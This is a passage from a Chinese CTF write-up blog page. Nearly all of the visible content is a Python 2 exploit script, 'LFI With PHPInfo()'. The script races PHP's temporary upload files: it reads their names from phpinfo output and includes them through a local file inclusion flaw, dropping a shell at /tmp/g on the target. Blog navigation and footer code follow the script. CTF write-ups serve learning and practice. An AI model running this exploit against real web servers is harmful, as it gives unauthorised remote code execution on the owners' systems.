</span></span><span class="line"><span class="ln"> 44</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 45</span><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">phpinforeq</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 46</span><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 47</span><span class="cl">    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">offset</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 48</span><span class="cl">        <span class="n">d</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 49</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 50</span><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s2">&#34;[tmp_name] =&amp;gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 51</span><span class="cl">        <span class="n">fn</span> <span class="o">=</span> <span class="n">d</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">17</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">31</span><span class="p">]</span>
</span></span><span class="line"><span class="ln"> 52</span><span class="cl">    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 53</span><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="ln"> 54</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 55</span><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">lfireq</span> <span class="o">%</span> <span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="n">host</span><span class="p">))</span>
</span></span><span class="line"><span class="ln"> 56</span><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="n">s2</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 57</span><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 58</span><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 59</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 60</span><span class="cl">    <span class="k">if</span> <span class="n">d</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">tag</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 61</span><span class="cl">        <span class="k">return</span> <span class="n">fn</span>
</span></span><span class="line"><span class="ln"> 62</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 63</span><span class="cl"><span class="n">counter</span><span class="o">=</span><span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 64</span><span class="cl"><span class="k">class</span> <span class="nc">ThreadWorker</span><span class="p">(</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 65</span><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 66</span><span class="cl">        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 67</span><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">event</span> <span class="o">=</span> <span class="n">e</span>
</span></span><span class="line"><span class="ln"> 68</span><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">lock</span> <span class="o">=</span>  <span class="n">l</span>
</span></span><span class="line"><span class="ln"> 69</span><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">maxattempts</span> <span class="o">=</span> <span class="n">m</span>
</span></span><span class="line"><span class="ln"> 70</span><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">args</span> <span class="o">=</span> <span class="n">args</span>
</span></span><span class="line"><span class="ln"> 71</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 72</span><span class="cl">    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 73</span><span class="cl">        <span class="k">global</span> <span class="n">counter</span>
</span></span><span class="line"><span class="ln"> 74</span><span class="cl">        <span class="k">while</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">event</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 75</span><span class="cl">            <span class="k">with</span> <span class="bp">self</span><span class="o">.</span><span class="n">lock</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 76</span><span class="cl">                <span class="k">if</span> <span class="n">counter</span> <span class="o">&gt;=</span> <span class="bp">self</span><span class="o">.</span><span class="n">maxattempts</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 77</span><span class="cl">                    <span class="k">return</span>
</span></span><span class="line"><span class="ln"> 78</span><span class="cl">                <span class="n">counter</span><span class="o">+=</span><span class="mi">1</span>
</span></span><span class="line"><span class="ln"> 79</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 80</span><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 81</span><span class="cl">                <span class="n">x</span> <span class="o">=</span> <span class="n">phpInfoLFI</span><span class="p">(</span><span class="o">*</span><span class="bp">self</span><span class="o">.</span><span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 82</span><span class="cl">                <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">event</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 83</span><span class="cl">                    <span class="k">break</span>                
</span></span><span class="line"><span class="ln"> 84</span><span class="cl">                <span class="k">if</span> <span class="n">x</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 85</span><span class="cl">                    <span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Got it! Shell created in /tmp/g&#34;</span>
</span></span><span class="line"><span class="ln"> 86</span><span class="cl">                    <span class="bp">self</span><span class="o">.</span><span class="n">event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 87</span><span class="cl">                    
</span></span><span class="line"><span class="ln"> 88</span><span class="cl">            <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 89</span><span class="cl">                <span class="k">return</span>
</span></span><span class="line"><span class="ln"> 90</span><span class="cl">    
</span></span><span class="line"><span class="ln"> 91</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 92</span><span class="cl"><span class="k">def</span> <span class="nf">getOffset</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">phpinforeq</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 93</span><span class="cl">    <span class="s2">&#34;&#34;&#34;Gets offset of tmp_name in the php output&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 94</span><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 95</span><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="ln"> 96</span><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">phpinforeq</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 97</span><span class="cl">    
</span></span><span class="line"><span class="ln"> 98</span><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 99</span><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">100</span><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">101</span><span class="cl">        <span class="n">d</span><span class="o">+=</span><span class="n">i</span>        
</span></span><span class="line"><span class="ln">102</span><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">103</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">104</span><span class="cl">        <span class="c1"># detect the final chunk</span>
</span></span><span class="line"><span class="ln">105</span><span class="cl">        <span class="k">if</span> <span class="n">i</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;0</span><span class="se">\r\n\r\n</span><span class="s2">&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">106</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">107</span><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">108</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;[tmp_name] =&amp;gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">109</span><span class="cl">    <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">110</span><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;No php tmp_name in phpinfo output&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">111</span><span class="cl">    
</span></span><span class="line"><span class="ln">112</span><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;found </span><span class="si">%s</span><span class="s2"> at </span><span class="si">%i</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">10</span><span class="p">],</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">113</span><span class="cl">    <span class="c1"># padded up a bit</span>
</span></span><span class="line"><span class="ln">114</span><span class="cl">    <span class="k">return</span> <span class="n">i</span><span class="o">+</span><span class="mi">256</span>
</span></span><span class="line"><span class="ln">115</span><span class="cl"> 
</span></span><span class="line"><span class="ln">116</span><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">117</span><span class="cl">    
</span></span><span class="line"><span class="ln">118</span><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;LFI With PHPInfo()&#34;</span>
</span></span><span class="line"><span class="ln">119</span><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;-=&#34;</span> <span class="o">*</span> <span class="mi">30</span>
</span></span><span class="line"><span class="ln">120</span><span class="cl"> 
</span></span><span class="line"><span class="ln">121</span><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">122</span><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;Usage: </span><span class="si">%s</span><span class="s2"> host [port] [threads]&#34;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">123</span><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">124</span><span class="cl"> 
</span></span><span class="line"><span class="ln">125</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">126</span><span class="cl">        <span class="n">host</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">gethostbyname</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">127</span><span class="cl">    <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">128</span><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;Error with hostname </span><span class="si">%s</span><span class="s2">: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">129</span><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">130</span><span class="cl"> 
</span></span><span class="line"><span class="ln">131</span><span class="cl">    <span class="n">port</span><span class="o">=</span><span class="mi">80</span>
</span></span><span class="line"><span class="ln">132</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">133</span><span class="cl">        <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">134</span><span class="cl">    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">135</span><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="ln">136</span><span class="cl">    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">137</span><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;Error with port </span><span class="si">%d</span><span class="s2">: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">138</span><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">139</span><span class="cl">    
</span></span><span class="line"><span class="ln">140</span><span class="cl">    <span class="n">poolsz</span><span class="o">=</span><span class="mi">10</span>
</span></span><span class="line"><span class="ln">141</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">142</span><span class="cl">        <span class="n">poolsz</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">143</span><span class="cl">    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">144</span><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="ln">145</span><span class="cl">    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">146</span><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;Error with poolsz </span><span class="si">%d</span><span class="s2">: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">147</span><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">148</span><span class="cl"> 
</span></span><span class="line"><span class="ln">149</span><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;Getting initial offset...&#34;</span><span class="p">,</span>  
</span></span><span class="line"><span class="ln">150</span><span class="cl">    <span class="n">reqphp</span><span class="p">,</span> <span class="n">tag</span><span class="p">,</span> <span class="n">reqlfi</span> <span class="o">=</span> <span class="n">setup</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">151</span><span class="cl">    <span class="n">offset</span> <span class="o">=</span> <span class="n">getOffset</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">reqphp</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">152</span><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">153</span><span class="cl"> 
</span></span><span class="line"><span class="ln">154</span><span class="cl">    <span class="n">maxattempts</span> <span class="o">=</span> <span class="mi">1000</span>
</span></span><span class="line"><span class="ln">155</span><span class="cl">    <span class="n">e</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">156</span><span class="cl">    <span class="n">l</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Lock</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">157</span><span class="cl"> 
</span></span><span class="line"><span class="ln">158</span><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;Spawning worker pool (</span><span class="si">%d</span><span class="s2">)...&#34;</span> <span class="o">%</span> <span class="n">poolsz</span>
</span></span><span class="line"><span class="ln">159</span><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">160</span><span class="cl"> 
</span></span><span class="line"><span class="ln">161</span><span class="cl">    <span class="n">tp</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="ln">162</span><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">poolsz</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">163</span><span class="cl">        <span class="n">tp</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ThreadWorker</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">l</span><span class="p">,</span><span class="n">maxattempts</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">reqphp</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">reqlfi</span><span class="p">,</span> <span class="n">tag</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">164</span><span class="cl"> 
</span></span><span class="line"><span class="ln">165</span><span class="cl">    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">tp</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">166</span><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">167</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">168</span><span class="cl">        <span class="k">while</span> <span class="ow">not</span> <span class="n">e</span><span class="o">.</span><span class="n">wait</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">169</span><span class="cl">            <span class="k">if</span> <span class="n">e</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">170</span><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="ln">171</span><span class="cl">            <span class="k">with</span> <span class="n">l</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">172</span><span class="cl">                <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span> <span class="s2">&#34;</span><span class="se">\r</span><span class="si">% 4d</span><span class="s2"> / </span><span class="si">% 4d</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">counter</span><span class="p">,</span> <span class="n">maxattempts</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">173</span><span class="cl">                <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">174</span><span class="cl">                <span class="k">if</span> <span class="n">counter</span> <span class="o">&gt;=</span> <span class="n">maxattempts</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">175</span><span class="cl">                    <span class="k">break</span>
</span></span><span class="line"><span class="ln">176</span><span class="cl">        <span class="nb">print</span>
</span></span><span class="line"><span class="ln">177</span><span class="cl">        <span class="k">if</span> <span class="n">e</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">178</span><span class="cl">            <span class="nb">print</span> <span class="s2">&#34;Woot!  \m/&#34;</span>
</span></span><span class="line"><span class="ln">179</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">180</span><span class="cl">            <span class="nb">print</span> <span class="s2">&#34;:(&#34;</span>
</span></span><span class="line"><span class="ln">181</span><span class="cl">    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">182</span><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Telling threads to shutdown...&#34;</span>
</span></span><span class="line"><span class="ln">183</span><span class="cl">        <span class="n">e</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">184</span><span class="cl">    
</span></span><span class="line"><span class="ln">185</span><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;Shuttin&#39; down...&#34;</span>
</span></span><span class="line"><span class="ln">186</span><span class="cl">    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">tp</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">187</span><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">188</span><span class="cl"> 
</span></span><span class="line"><span class="ln">189</span><span class="cl"><span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">190</span><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
      <li><a href="http://localhost:1313/tags/web/">Web</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/post/ctfshow/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
    <span class="title">« 上一页</span>
    <br>
    <span>CTFSHOW-命令执行-Writeup</span>
  </a>
  <a class="next" href="http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
    <span class="title">下一页 »</span>
    <br>
    <span>CTFSHOW-文件上传-Writeup</span>
  </a>
</nav>

  </footer><div id="tw-comment"></div>
<script>
    
    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
    const setGiscusTheme = () => {
        const sendMessage = (message) => {
            const iframe = document.querySelector('iframe.giscus-frame');
            if (iframe) {
                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
            }
        }
        sendMessage({setConfig: {theme: getStoredTheme()}})
    }

    document.addEventListener("DOMContentLoaded", () => {
        const giscusAttributes = {
            "src": "https://giscus.app/client.js",
            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
            "data-repo-id": "xxxxxx",
            "data-category": "Announcements",
            "data-category-id": "xxxxx",
            "data-mapping": "pathname",
            "data-strict": "0",
            "data-reactions-enabled": "1",
            "data-emit-metadata": "0",
            "data-input-position": "bottom",
            "data-theme": getStoredTheme(),
            "data-lang": "zh-CN",
            "data-loading": "lazy",
            "crossorigin": "anonymous",
        };

        
        const giscusScript = document.createElement("script");
        Object.entries(giscusAttributes).forEach(
                ([key, value]) => giscusScript.setAttribute(key, value));
        document.querySelector("#tw-comment").appendChild(giscusScript);

        
        const themeSwitcher = document.querySelector("#theme-toggle");
        if (themeSwitcher) {
            themeSwitcher.addEventListener("click", setGiscusTheme);
        }
        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
        if (themeFloatSwitcher) {
            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
        }
    });
</script>
</article>
    </main>
    
<footer class="footer">
        <span><a href="https://blog.xrntkk.top/">©2024 Xrntkk&rsquo;s Blog</a></span> · 


    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
    <div class="busuanzi-footer">
    <span id="busuanzi_container_site_pv">
        Total Visits: <span id="busuanzi_value_site_pv"></span> & 
    </span>
    <span id="busuanzi_container_site_uv">
        Unique Visitor: <span id="busuanzi_value_site_uv"></span>
    </span>
    </div></footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
